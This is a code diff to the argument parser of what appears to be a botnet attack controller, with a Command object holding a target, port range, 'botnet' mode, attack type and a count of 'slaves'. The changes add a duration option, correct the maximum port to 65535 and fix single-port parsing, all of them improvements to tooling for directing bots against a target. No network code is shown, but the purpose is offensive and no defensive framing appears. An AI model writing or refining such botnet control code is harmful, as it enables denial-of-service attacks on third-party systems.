@@ -16,6 +16,7 @@ def ipGen() :
     return '.'.join(ip)
 
 class Command :
+    duration = None
     command = None
     slaves = None
     target = None 
@@ -28,7 +29,7 @@ class Command :
         pass
 
     def __repr__(self) :
-        return f'Command(command={self.command},target={self.target},ports={self.ports},mode={self.mode},count={self.count},type={attacks[self.aType]},slaves={self.slaves})'
+        return f'Command(command={self.command},target={self.target},ports={self.ports},mode={self.mode},count={self.count},duration={self.duration},type={attacks[self.aType]},slaves={self.slaves})'
 
 class ArgParseError(Exception) :
     def __init__(self,message="Argument Parse Exception") :
@@ -48,9 +49,10 @@ def parse_args(args) :
 
     cmd = Command()
     cmd.command = args[0]
-    cmd.ports = '1-65536'
+    cmd.ports = '1-65535'
     cmd.mode = 'botnet'
     cmd.count = 100
+    cmd.duration = 30
     cmd.slaves = 255
     cmd.aType = '0'
 
@@ -75,6 +77,9 @@ def parse_args(args) :
 
             elif flag in ['-c','--count'] :
                 cmd.count = int(args[i+1])
+
+            elif flag in ['-d','--duration'] :
+                cmd.duration = int(args[i+1])
             
             elif flag in ['-s','--slaves'] :
                 if args[i+1] == 'all' :
@@ -88,9 +93,9 @@ def parse_args(args) :
             elif flag in ['-p','--ports'] :
                 cmd.ports = args[i+1]
                 if cmd.ports == 'all' :
-                    cmd.ports = '1-65536'
+                    cmd.ports = '1-65535'
                 if len(cmd.ports.split('-')) == 1 :
-                    cmd.ports = f'{cmd.ports}-{int(cmd.ports)+1}' 
+                    cmd.ports = f'{cmd.ports}-{cmd.ports}' 
         except IndexError :
             raise ArgParseError('Incomplete Command')
         except BaseException as e :
